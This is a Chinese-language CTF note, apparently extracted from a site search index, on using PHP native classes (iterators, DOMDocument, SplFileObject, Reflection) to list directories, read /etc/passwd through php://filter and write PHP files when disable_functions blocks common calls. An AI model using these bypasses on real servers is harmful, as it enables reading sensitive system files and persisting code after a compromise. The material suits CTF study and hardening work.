\u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7) poc # # \u7b80\u5355\u5217\u76ee\u5f55 $dir = \"./geek\"; $d = new DirectoryIterator($dir); while ($d->valid()){ echo $d.\"\\n\"; $d->next(); } # \u4e5f\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u6587\u4ef6\u7684\u4fe1\u606f $dir = \"./geek\"; $d = new DirectoryIterator($dir); while($d->valid()){ # \u83b7\u53d6\u6700\u540e\u8bbf\u95ee\u65f6\u95f4 var_dump($d->getATime()); # \u83b7\u53d6\u521b\u5efa\u65f6\u95f4 var_dump($d->getCTime()); # \u83b7\u53d6\u6700\u540e\u4fee\u6539\u65f6\u95f4 var_dump($d->getMtime()); # \u83b7\u53d6\u6587\u4ef6\u540d\uff0c # \u76f4\u63a5\u7528 __toString \u4e5f\u53ef\u4ee5 var_dump($d->getFilename()); var_dump((string)$d); # \u83b7\u53d6\u6587\u4ef6\u540d (\u81ea\u52a8\u9664\u53bb\u540e\u7f00\u540d)\uff0c # \u6bd4\u5982\u9664\u53bb .php \u540e\u7f00\u540d var_dump($d->getBasename(\"php\")); # \u83b7\u53d6\u76ee\u5f55\u548c\u6587\u4ef6\u540d var_dump($d->getPathname()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u8005 var_dump($d->getOwner()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u7ec4 var_dump($d->getGroup()); # \u83b7\u53d6\u6587\u4ef6inode\u7f16\u53f7 var_dump($d->getInode()); # \u83b7\u53d6\u6587\u4ef6\u6743\u9650 var_dump(substr(sprintf(\"%o\",$d->getPerms()),-4)); # \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f var_dump(($d->getSize()/1024).\" kb\"); # \u83b7\u53d6\u6587\u4ef6\u7c7b\u578b (file/dir) var_dump($d->getType()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u76ee\u5f55 var_dump($d->isDir()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u6587\u4ef6 (\u4e0d\u662f\u76ee\u5f55) var_dump($d->isFile()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3a ./.. var_dump($d->isDot()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u6267\u884c var_dump($d->isExecute()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u94fe\u63a5\u6587\u4ef6 var_dump($d->isLink()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u8bfb var_dump($d->isReadable()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u5199 var_dump($d->isWriteable()); $d->next(); } # \u4e00\u4e9b\u5176\u4ed6\u65b9\u6cd5\u7684\u529f\u80fd # \u83b7\u53d6\u5f53\u524d\u76ee\u5f55\u8def\u5f84 (\u5176\u5b9e\u4e5f\u5c31\u662f ? ) var_dump($d->path()); # \u83b7\u53d6\u5f53\u524d\u5143\u7d20\u7684\u7d22\u5f15 var_dump($d->key()); # \u5c06\u5f53\u524d\u7d22\u5f15\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u5143\u7d20 $d->next(); # \u5c06\u7d22\u5f15\u91cd\u7f6e\u5230\u5f00\u5934 $d->rewind(); # \u8bbe\u7f6e\u7d22\u5f15 $d->seek(0); # \u5224\u65ad\u5f53\u524d\u7d22\u5f15\u7684\u6587\u4ef6\u662f\u5426\u5408\u6cd5 (\u662f\u5426\u662f\u4e00\u4e2a\u6587\u4ef6) $d->vaild(); FilesystemIterator # \u5229\u7528\u7248\u672c\uff1a (PHP 5 >= 5.3.0, PHP 7) \u5176\u5b9e\u8fd9\u4e2a\u7c7b\u5b9e\u9645\u4e0a\u4e5f\u5c31\u662f DirectoryIterator \u7c7b\u7684\u5347\u7ea7\u7248\uff0c\u57fa\u672c\u7ee7\u627f\u4e86 DirectorIterator \u7c7b\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u6240\u4ee5\u5229\u7528\u65b9\u5f0f\u548c DirectorIterator \u4e00\u6837: poc # # \u7b80\u5355\u5217\u76ee\u5f55 $dir = \"./geek\"; $d = new FilesystemIterator($dir); while ($d->valid()){ echo $d.\"\\n\"; $d->next(); } # \u4e5f\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u6587\u4ef6\u7684\u4fe1\u606f $dir = \"./geek\"; $d = new DirectoryIterator($dir); while($d->valid()){ # \u83b7\u53d6\u6700\u540e\u8bbf\u95ee\u65f6\u95f4 var_dump($d->getATime()); # \u83b7\u53d6\u521b\u5efa\u65f6\u95f4 var_dump($d->getCTime()); # \u83b7\u53d6\u6700\u540e\u4fee\u6539\u65f6\u95f4 var_dump($d->getMtime()); # \u83b7\u53d6\u6587\u4ef6\u540d\uff0c # \u76f4\u63a5\u7528 __toString \u4e5f\u53ef\u4ee5 var_dump($d->getFilename()); var_dump((string)$d); # \u83b7\u53d6\u6587\u4ef6\u540d (\u81ea\u52a8\u9664\u53bb\u540e\u7f00\u540d)\uff0c # \u6bd4\u5982\u9664\u53bb .php \u540e\u7f00\u540d var_dump($d->getBasename(\"php\")); # \u83b7\u53d6\u76ee\u5f55\u548c\u6587\u4ef6\u540d var_dump($d->getPathname()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u8005 var_dump($d->getOwner()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u7ec4 var_dump($d->getGroup()); # \u83b7\u53d6\u6587\u4ef6inode\u7f16\u53f7 var_dump($d->getInode()); # \u83b7\u53d6\u6587\u4ef6\u6743\u9650 var_dump(substr(sprintf(\"%o\",$d->getPerms()),-4)); # \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f var_dump(($d->getSize()/1024).\" kb\"); # \u83b7\u53d6\u6587\u4ef6\u7c7b\u578b (file/dir) var_dump($d->getType()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u76ee\u5f55 var_dump($d->isDir()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u6587\u4ef6 (\u4e0d\u662f\u76ee\u5f55) var_dump($d->isFile()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3a ./.. var_dump($d->isDot()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u6267\u884c var_dump($d->isExecute()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u94fe\u63a5\u6587\u4ef6 var_dump($d->isLink()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u8bfb var_dump($d->isReadable()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u5199 var_dump($d->isWriteable()); $d->next(); } # \u4e00\u4e9b\u5176\u4ed6\u65b9\u6cd5\u7684\u529f\u80fd # \u83b7\u53d6\u5f53\u524d\u76ee\u5f55\u8def\u5f84 (\u5176\u5b9e\u4e5f\u5c31\u662f ? ) var_dump($d->path()); # \u83b7\u53d6\u5f53\u524d\u5143\u7d20\u7684\u7d22\u5f15 var_dump($d->key()); # \u5c06\u5f53\u524d\u7d22\u5f15\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u5143\u7d20 $d->next(); # \u5c06\u7d22\u5f15\u91cd\u7f6e\u5230\u5f00\u5934 $d->rewind(); # \u8bbe\u7f6e\u7d22\u5f15 $d->seek(0); # \u5224\u65ad\u5f53\u524d\u7d22\u5f15\u7684\u6587\u4ef6\u662f\u5426\u5408\u6cd5 (\u662f\u5426\u662f\u4e00\u4e2a\u6587\u4ef6) $d->vaild(); GlobIterator # \u5229\u7528\u7248\u672c\uff1a (PHP 5 >= 5.3.0, PHP 7) \u5217\u76ee\u5f55poc # foreach(new GlobIterator(\"./*\") as $f){ echo $f.\"\\n\"; } DOMDocument # \u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7) \u8fd9\u4e2a\u7c7b\u672c\u610f\u662f\u5904\u7406 XML \u548c HTML \u5185\u5bb9\uff0c\u4e0d\u8fc7\u4e5f\u6709\u76f8\u5e94\u7684\u8bfb/\u5199\u6587\u4ef6\u7684\u65b9\u6cd5\uff0c\u53ea\u8981\u5229\u7528 \u4f2a\u534f\u8bae \u7a0d\u505a\u52a0\u5de5\u5c31\u53ef\u4ee5\u65e0\u6742\u8d28\u5730\u5bf9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c \u8bfb\u6587\u4ef6poc # # \u8bfb\u6587\u4ef6 # \u5148\u7528 convert.base64 \u5c06\u6587\u4ef6\u5185\u5bb9base64\uff0c\u907f\u514d\u51fa\u73b0\u989d\u5916\u7684 <p> \u6807\u7b7e # \u7136\u540e\u5c06\u8bfb\u53d6\u7684\u5185\u5bb9\u8f6c\u6362\u6210 XML \u683c\u5f0f\uff0c\u518d\u52a0\u8f7d\u5b83\uff0c\u6700\u540e\u53d6 <p> \u6807\u7b7e\u5185\u7684\u5185\u5bb9 (\u5982\u679c\u60f3\u83b7\u53d6\u7eaf\u51c0\u6d41\u5219\u53ef\u4ee5\u518d\u8fdb\u884cbase64\u89e3\u7801) $f=\"/etc/passwd\"; $d=new DOMDocument(); $d->loadHTMLFile(\"php://filter/convert.base64-encode/resource=$f\"); $d->loadXML($d->saveXML()); echo $d->getElementsByTagName(\"p\")[0]->textContent; \u5199\u6587\u4ef6poc # # \u5199\u6587\u4ef6 # \u5148\u7528 string.strip_tags \u5c06\u591a\u4f59\u7684 HTML \u6807\u7b7e\u53bb\u6389\uff0c\u7136\u540e\u518d\u7528 convert.base64 \u5c06\u591a\u4f59\u7684\u5176\u4ed6\u6742\u8d28 (\u5982\u7a7a\u683c\uff0c\u53cc\u5f15\u53f7\u7b49\u975ebase64\u5b57\u7b26\u53bb\u6389) $f=\"./test.php\"; $d=new DOMDocument(); $d->loadHTML(\"dGVzdA==\"); $d->saveHtmlFile(\"php://filter/string.strip_tags|convert.base64-decode/resource=$f\"); finfo # \u5229\u7528\u7248\u672c: (PHP >= 5.3.0, PECL fileinfo >= 0.1.0) \u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728(\u5224\u65ad\u6587\u4ef6\u7c7b\u578b)poc # $f = \"./aasd.php\"; $ff = new finfo(FILEINFO_MIME); echo $ff->file($f); SplFileObject # SplFileInfo \u7c7b\u4e3a\u5355\u4e2a\u6587\u4ef6\u7684\u4fe1\u606f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u7ea7\u7684\u9762\u5411\u5bf9\u8c61\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u7528\u4e8e\u5bf9\u6587\u4ef6\u5185\u5bb9\u7684\u904d\u5386\u3001\u67e5\u627e\u3001\u64cd\u4f5c\u7b49\u3002\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7c7b\u4e2d\u7684\u65b9\u6cd5\u4ee3\u66ff\u666e\u901a\u51fd\u6570\u6765\u8bfb\u5199\u6587\u4ef6\u3002 \u8bfb\u6587\u4ef6poc # $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } // \u6216\u8005\u7528\u4f2a\u534f\u8baebase64\u76f4\u63a5\u8f93\u51fa\uff0c\u6709\u65f6\u5019\u6709\u5947\u6548 $context = new SplFileObject('php://filter/read=convert.base64-encode/resource=/etc/passwd'); echo $context; \u5199\u6587\u4ef6poc # $f = new SplFileObject('./file', \"w\"); $f->fwrite(\"file\"); IntlChar # \u5229\u7528\u7248\u672c\uff1a (PHP 7, PHP 8, Intl extension) poc # \u53ef\u4ee5\u53d6\u4ee3 ord \uff0c chr \u7b49\u51fd\u6570 # ord \u548c chr \u51fd\u6570 IntlChar::ord(\"a\"); IntlChar::chr(97); ReflectionFunction # \u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7) poc # \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u53cd\u5c04\u7c7b\u62ff\u5230\u8bb8\u591a\u51fd\u6570\u4e2d\u7684\u4fe1\u606f # \u53cd\u5c04\u8c03\u7528\u51fd\u6570 (new ReflectionFunction(\"func?\"))->invoke(args); (new ReflectionFunction(\"func?\"))->invokeArgs([args1,args2]); # \u83b7\u53d6\u51fd\u6570\u4fe1\u606f (new ReflectionFunction(\"func?\"))->isDisabled() // \u51fd\u6570\u662f\u5426\u53ef\u7528 (new ReflectionFunction(\"func?\"))->getClosure() // \u83b7\u53d6\u8be5\u533f\u540d\u51fd\u6570 (new ReflectionFunction(\"func?\"))->getDocComment() // \u83b7\u53d6\u51fd\u6570\u6ce8\u91ca\u5185\u5bb9 (new ReflectionFunction(\"func?\"))->getStartLine() // \u83b7\u53d6\u51fd\u6570\u5f00\u59cb\u884c\u53f7 (new ReflectionFunction(\"func?\"))->getEndLine() // \u83b7\u53d6\u51fd\u6570\u7ed3\u675f\u884c\u53f7 (new ReflectionFunction(\"func?\"))->getExtensionName() // \u83b7\u53d6\u6269\u5c55\u540d\u79f0 (new ReflectionFunction(\"func?\"))->getName() // \u83b7\u53d6\u51fd\u6570\u540d\u79f0 (new ReflectionFunction(\"func?\"))->getNamespaceName() // \u83b7\u53d6\u547d\u540d\u7a7a\u95f4\u540d\u79f0 (new ReflectionFunction(\"func?\"))->getNumberOfParameters() // \u83b7\u53d6\u51fd\u6570\u53c2\u6570\u6570\u91cf (new ReflectionFunction(\"func?\"))->getNumberOfRequiredParameters() // \u83b7\u53d6\u51fd\u6570\u5fc5\u987b\u4f20\u5165\u7684\u53c2\u6570\u6570\u91cf (new ReflectionFunction(\"func?\"))->getParameters() // \u83b7\u53d6\u51fd\u6570\u53c2\u6570\u540d (new ReflectionFunction(\"func?\"))->getShortName() // \u83b7\u53d6\u51fd\u6570\u77ed\u540d (new ReflectionFunction(\"func?\"))->getStaticVariables() // \u83b7\u53d6\u51fd\u6570\u9759\u6001\u53d8\u91cf (new ReflectionFunction(\"func?\"))->hasReturnType() // \u51fd\u6570\u662f\u5426\u6709\u7279\u5b9a\u8fd4\u56de\u7c7b\u578b (new ReflectionFunction(\"func?\"))->inNamespace() // \u51fd\u6570\u662f\u5426\u5b9a\u4e49\u5728\u547d\u540d\u7a7a\u95f4 (new ReflectionFunction(\"func?\"))->isClosure() // \u51fd\u6570\u662f\u5426\u662f\u533f\u540d\u51fd\u6570 (new ReflectionFunction(\"func?\"))->isDeprecated() // \u51fd\u6570\u662f\u5426\u5f03\u7528 (new ReflectionFunction(\"func?\"))->isGenerator() // \u51fd\u6570\u662f\u5426\u662f\u751f\u6210\u5668\u51fd\u6570 (new ReflectionFunction(\"func?\"))->isInternal() // \u51fd\u6570\u662f\u5426\u662f\u5185\u90e8\u51fd\u6570 (new ReflectionFunction(\"func?\"))->isUserDefined() // \u51fd\u6570\u662f\u5426\u662f\u7528\u6237\u5b9a\u4e49 ReflectionMethod # \u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7) poc # \u5229\u7528\u529f\u80fd\uff1a - \u8bbe\u7f6e\u7c7b\u4e2d\u79c1\u6709/\u53d7\u4fdd\u62a4\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee - \u901a\u8fc7\u53cd\u5c04\u8c03\u7528\u65b9\u6cd5 - \u83b7\u53d6\u65b9\u6cd5\u4fe1\u606f # \u53cd\u5c04\u8c03\u7528\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->invoke(new [class?]/NULL(\u9759\u6001\u7c7b),args1,args2); (new ReflectionMethod(\"class?\",\"method?\"))->invokeArgs(new [class?]/NULL(\u9759\u6001\u7c7b,[args1,args2])); # \u8bbe\u7f6e\u79c1\u6709/\u53d7\u4fdd\u62a4\u65b9\u6cd5 $f = new ReflectionMethod(\"class?\",\"method?\"); $f->setAccessible(true); $f->invoke(new [class?]); (new [class?])->[method?](); // \u4f1a\u62a5\u9519 # \u83b7\u53d6\u51fd\u6570\u4fe1\u606f (new ReflectionMethod(\"class?\",\"method?\"))->getDeclaringClass() // \u83b7\u53d6\u53cd\u5c04\u65b9\u6cd5\u7684\u7c7b\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u8fd4\u56de (new ReflectionMethod(\"class?\",\"method?\"))->isAbstract() // \u65b9\u6cd5\u662f\u5426\u662f\u62bd\u8c61\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isConstructor() // \u65b9\u6cd5\u662f\u5426\u662f __construct (new ReflectionMethod(\"class?\",\"method?\"))->isDestructor() // \u65b9\u6cd5\u662f\u5426\u662f __destruct (new ReflectionMethod(\"class?\",\"method?\"))->isFinal() // \u65b9\u6cd5\u662f\u5426\u5b9a\u4e49\u4e86final (new ReflectionMethod(\"class?\",\"method?\"))->isPrivate() // \u65b9\u6cd5\u662f\u5426\u662f\u79c1\u6709\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isProtected() // \u65b9\u6cd5\u662f\u5426\u662f\u53d7\u4fdd\u62a4\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isPublic() // \u65b9\u6cd5\u662f\u5426\u662f\u516c\u6709\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isStatic() // \u65b9\u6cd5\u662f\u5426\u662f\u9759\u6001\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->getDocComment() // \u83b7\u53d6\u65b9\u6cd5\u6ce8\u91ca\u5185\u5bb9 (new ReflectionMethod(\"class?\",\"method?\"))->getStartLine() // \u83b7\u53d6\u65b9\u6cd5\u5f00\u59cb\u884c\u53f7 (new ReflectionMethod(\"class?\",\"method?\"))->getEndLine() // \u83b7\u53d6\u65b9\u6cd5\u7ed3\u675f\u884c\u53f7 (new ReflectionMethod(\"class?\",\"method?\"))->getExtensionName() // \u83b7\u53d6\u6269\u5c55\u540d\u79f0 (new ReflectionMethod(\"class?\",\"method?\"))->getName() // \u83b7\u53d6\u65b9\u6cd5\u540d\u79f0 (new ReflectionMethod(\"class?\",\"method?\"))->getNamespaceName() // \u83b7\u53d6\u547d\u540d\u7a7a\u95f4\u540d\u79f0 (new ReflectionMethod(\"class?\",\"method?\"))->getNumberOfParameters() // \u83b7\u53d6\u65b9\u6cd5\u53c2\u6570\u6570\u91cf (new ReflectionMethod(\"class?\",\"method?\"))->getNumberOfRequiredParameters() // \u83b7\u53d6\u65b9\u6cd5\u5fc5\u987b\u4f20\u5165\u7684\u53c2\u6570\u6570\u91cf (new ReflectionMethod(\"class?\",\"method?\"))->getParameters() // \u83b7\u53d6\u65b9\u6cd5\u53c2\u6570\u540d (new ReflectionMethod(\"class?\",\"method?\"))->getShortName() // \u83b7\u53d6\u65b9\u6cd5\u77ed\u540d (new ReflectionMethod(\"class?\",\"method?\"))->getStaticVariables() // \u83b7\u53d6\u65b9\u6cd5\u9759\u6001\u53d8\u91cf (new ReflectionMethod(\"class?\",\"method?\"))->hasReturnType() // \u65b9\u6cd5\u662f\u5426\u6709\u7279\u5b9a\u8fd4\u56de\u7c7b\u578b (new ReflectionMethod(\"class?\",\"method?\"))->inNamespace() // \u65b9\u6cd5\u662f\u5426\u5b9a\u4e49\u5728\u547d\u540d\u7a7a\u95f4 (new ReflectionMethod(\"class?\",\"method?\"))->isClosure() // \u65b9\u6cd5\u662f\u5426\u662f\u533f\u540d\u51fd\u6570 (new ReflectionMethod(\"class?\",\"method?\"))->isDeprecated() // \u65b9\u6cd5\u662f\u5426\u5f03\u7528 (new ReflectionMethod(\"class?\",\"method?\"))->isGenerator() // \u65b9\u6cd5\u662f\u5426\u662f\u751f\u6210\u5668\u51fd\u6570 (new ReflectionMethod(\"class?\",\"method?\"))->isInternal() // \u65b9\u6cd5\u662f\u5426\u662f\u5185\u90e8\u51fd\u6570 (new ReflectionMethod(\"class?\",\"method?\"))->isUserDefined() // \u65b9\u6cd5\u662f\u5426\u662f\u7528\u6237\u5b9a\u4e49 ReflectionClass # \u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7) poc # \u5229\u7528\u529f\u80fd\uff1a - \u83b7\u53d6/\u4fee\u6539\u7c7b\u4e2d\u9759\u6001\u5c5e\u6027\u7684\u503c - \u83b7\u53d6\u7c7b\u4e2d\u5c5e\u6027\u7684\u503c - \u5b9e\u4f8b\u5316\u65b0\u7c7b - \u83b7\u53d6\u7c7b\u4fe1\u606f # \u83b7\u53d6/\u4fee\u6539\u7c7b\u4e2d\u9759\u6001\u5c5e\u6027\u7684\u503c (new ReflectionClass(\"class?\"))->getStaticProperties(); # \u83b7\u53d6\u9759\u6001\u5c5e\u6027 (new ReflectionClass(\"class?\"))->getStaticPropertyValue(\"key?\",\"default_value?\"); # \u83b7\u53d6\u6307\u5b9a\u9759\u6001\u5c5e\u6027\u7684\u503c\uff0c\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u9ed8\u8ba4\u503c (new ReflectionClass(\"class?\"))->setStaticPropertyValue(\"key?\",\"value?\"); # \u8bbe\u7f6e\u9759\u6001\u5c5e\u6027\u7684\u503c # \u83b7\u53d6\u7c7b\u4e2d\u5c5e\u6027\u7684\u503c (new ReflectionClass(\"class?\"))->getProperties(); # \u83b7\u53d6\u5c5e\u6027 (new ReflectionClass(\"class?\"))->getProperty(\"key?\") # \u83b7\u53d6\u6307\u5b9a\u5c5e\u6027\u7684\u503c # \u5b9e\u4f8b\u5316\u65b0\u7c7b\uff0c # \u6bd4\u5982\u53cd\u5c04 phpinfo \u51fd\u6570 $c = new ReflectionClass('ReflectionFunction'); $iv = $c->newInstance('phpinfo'); $ia = $c->newInstanceArgs(array('phpinfo')); $ie = $c->newInstanceWithoutConstructor(); // \u8c03\u7528\u4e00\u4e2a\u7c7b\u4f46\u4e0d\u8c03\u7528\u5176 __construct \u65b9\u6cd5 # \u83b7\u53d6\u7c7b\u4fe1\u606f (new ReflectionClass(\"class?\"))->export(); // \u5bfc\u51fa\u7c7b (new ReflectionClass(\"class?\"))->getConstant(string $name) // \u83b7\u53d6\u7c7b\u4e2d\u6307\u5b9a\u5e38\u91cf\u503c (new ReflectionClass(\"class?\"))->getConstants(?int $filter = null) // \u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u5e38\u91cf\u503c (new ReflectionClass(\"class?\"))->getConstructor() // \u83b7\u53d6\u7c7b\u4e2d\u6784\u9020\u65b9\u6cd5(__construct)\u4f5c\u4e3a\u53cd\u5c04\u65b9\u6cd5\u8fd4\u56de (new ReflectionClass(\"class?\"))->getDefaultProperties() // \u83b7\u53d6\u7c7b\u4e2d\u9ed8\u8ba4\u5c5e\u6027 (new ReflectionClass(\"class?\"))->getDocComment() // \u83b7\u53d6\u7c7b\u7684\u6ce8\u91ca (new ReflectionClass(\"class?\"))->getStartLine() // \u83b7\u53d6\u7c7b\u5f00\u59cb\u884c\u53f7 (new ReflectionClass(\"class?\"))->getEndLine() // \u83b7\u53d6\u7c7b\u7ed3\u675f\u884c\u53f7 (new ReflectionClass(\"class?\"))->getExtensionName() // \u83b7\u53d6\u7c7b\u7684\u6269\u5c55\u540d\u79f0 (new ReflectionClass(\"class?\"))->getFileName() // \u83b7\u53d6\u7c7b\u6240\u5728\u7684\u6587\u4ef6\u540d (new ReflectionClass(\"class?\"))->getInterfaceNames() // \u83b7\u53d6\u7c7b\u7684\u63a5\u53e3\u540d\u79f0 (new ReflectionClass(\"class?\"))->getInterfaces() // \u83b7\u53d6\u7c7b\u7684\u63a5\u53e3 (new ReflectionClass(\"class?\"))->getMethod(string $name) // \u83b7\u53d6\u7c7b\u7684\u6307\u5b9a\u65b9\u6cd5\u4f5c\u4e3a\u53cd\u5c04\u65b9\u6cd5\u8fd4\u56de (new ReflectionClass(\"class?\"))->getMethods() // \u83b7\u53d6\u7c7b\u7684\u65b9\u6cd5 (new ReflectionClass(\"class?\"))->getModifiers() // \u83b7\u53d6\u7c7b\u7684\u4fee\u9970\u7b26 (new ReflectionClass(\"class?\"))->getName() // \u83b7\u53d6\u7c7b\u540d\u79f0 (new ReflectionClass(\"class?\"))->getNamespaceName() // \u83b7\u53d6\u7c7b\u6240\u5728\u547d\u540d\u7a7a\u95f4\u540d\u79f0 (new ReflectionClass(\"class?\"))->getParentClass() // \u83b7\u53d6\u7236\u7c7b\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u8fd4\u56de (new ReflectionClass(\"class?\"))->getReflectionConstant() // \u83b7\u53d6\u7c7b\u7684\u6307\u5b9a\u5e38\u91cf\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u5e38\u91cf\u8fd4\u56de (new ReflectionClass(\"class?\"))->getReflectionConstants() // \u83b7\u53d6\u7c7b\u7684\u5e38\u91cf\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u5e38\u91cf\u6570\u7ec4\u8fd4\u56de (new ReflectionClass(\"class?\"))->getShortName() // \u83b7\u53d6\u7c7b\u7684\u77ed\u540d (new ReflectionClass(\"class?\"))->getTraitAliases() // \u83b7\u53d6\u7c7b\u6240\u4f7f\u7528 trait \u522b\u540d\u7684\u6570\u7ec4 (new ReflectionClass(\"class?\"))->getTraitNames() // \u83b7\u53d6\u7c7b\u6240\u4f7f\u7528 traits \u540d\u79f0\u7684\u6570\u7ec4 (new ReflectionClass(\"class?\"))->getTraits() // \u83b7\u53d6\u7c7b\u6240\u4f7f\u7528\u7684 traits (new ReflectionClass(\"class?\"))->hasConstant(string $name) // \u7c7b\u662f\u5426\u6709\u6307\u5b9a\u7684\u5e38\u91cf (new ReflectionClass(\"class?\"))->hasMethod(string $name) // \u7c7b\u662f\u5426\u6709\u6307\u5b9a\u7684\u65b9\u6cd5 (new ReflectionClass(\"class?\"))->implementsInterface(string $interface) // \u7c7b\u662f\u5426\u5b9e\u73b0\u6307\u5b9a\u7684\u63a5\u53e3 (new ReflectionClass(\"class?\"))->inNamespace() // \u7c7b\u662f\u5426\u5728\u547d\u540d\u7a7a\u95f4\u4e2d (new ReflectionClass(\"class?\"))->isAbstract() // \u7c7b\u662f\u5426\u662f\u62bd\u8c61\u7c7b (new ReflectionClass(\"class?\"))->isAnonymous() // \u7c7b\u662f\u5426\u662f\u533f\u540d\u7c7b (new ReflectionClass(\"class?\"))->isCloneable() // \u7c7b\u662f\u5426\u662f\u53ef\u590d\u5236\u7684 (new ReflectionClass(\"class?\"))->isFinal() // \u7c7b\u662f\u5426\u58f0\u660e\u4e3a final (new ReflectionClass(\"class?\"))->isInternal() // \u7c7b\u662f\u5426\u662f\u5185\u90e8\u7684 (new ReflectionClass(\"class?\"))->isIterable() // \u7c7b\u662f\u5426\u662f\u4e00\u4e2a\u8fed\u4ee3\u7c7b (new ReflectionClass(\"class?\"))->isIterateable() // \u7c7b\u662f\u5426\u662f\u53ef\u8fed\u4ee3\u7684 (new ReflectionClass(\"class?\"))->isSubclassOf(string $class) // \u7c7b\u662f\u5426\u662f\u6307\u5b9a\u7c7b\u7684\u5b50\u7c7b (new ReflectionClass(\"class?\"))->isTrait() // \u7c7b\u662f\u5426\u662f trait (new ReflectionClass(\"class?\"))->isUserDefined() // \u7c7b\u662f\u5426\u662f\u7528\u6237\u5b9a\u4e49\u7684","title":"\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0b\u7684php\u539f\u751f\u7c7b\u5229\u7528"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0b\u7684php\u539f\u751f\u7c7b\u5229\u7528","text":"\u6253ctf\u65f6\u6709\u65f6\u5019\u4f1a\u9047\u5230\u4e00\u4e9b\u6bd4\u8f83\u53d8\u6001\u7684disable functions\uff0c\u628a\u8bb8\u591a\u5e38\u89c1\u7684\u51fd\u6570\u90fd\u7981\u7528\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u5199\u5165\u6587\u4ef6/\u8bfb\u53d6\u6587\u4ef6\u7b49\uff0c\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e00\u4e9bphp\u539f\u751f\u7c7b\u7684\u5229\u7528 \u4e00\u4e2adisable functions\u4f8b\u5b50\u5982\u4e0b(\u4ece\u67d0\u9053\u9898\u76ee\u62a0\u4e0b\u6765\u7684): zend_version, func_num_args, func_get_arg, func_get_args, strcmp, strncmp, strcasecmp, strncasecmp, each, error_log, define, defined, get_class, get_called_class, get_parent_class, method_exists, property_exists, class_exists, interface_exists, trait_exists, function_exists, class_alias, get_included_files, get_required_files, is_subclass_of, is_a, get_class_vars, get_object_vars, get_mangled_object_vars, get_class_methods, trigger_error, user_error, restore_error_handler, set_exception_handler, restore_exception_handler, get_declared_classes, get_declared_traits, get_declared_interfaces, get_defined_functions, get_defined_vars, create_function, get_resource_type, get_resources, get_loaded_extensions, extension_loaded, get_extension_funcs, get_defined_constants, debug_backtrace, debug_print_backtrace, gc_mem_caches, gc_collect_cycles, gc_enabled, gc_enable, gc_disable, gc_status, strtotime, date, idate, gmdate, mktime, gmmktime, checkdate, strftime, gmstrftime, time, localtime, getdate, date_create, date_create_immutable, date_create_from_format, date_create_immutable_from_format, date_parse, date_parse_from_format, date_get_last_errors, date_format, date_modify, date_add, date_sub, date_timezone_get, date_timezone_set, date_offset_get, date_diff, date_time_set, date_date_set, date_isodate_set, date_timestamp_set, date_timestamp_get, timezone_open, timezone_name_get, timezone_name_from_abbr, timezone_offset_get, timezone_transitions_get, timezone_location_get, timezone_identifiers_list, timezone_abbreviations_list, timezone_version_get, date_interval_create_from_date_string, date_interval_format, 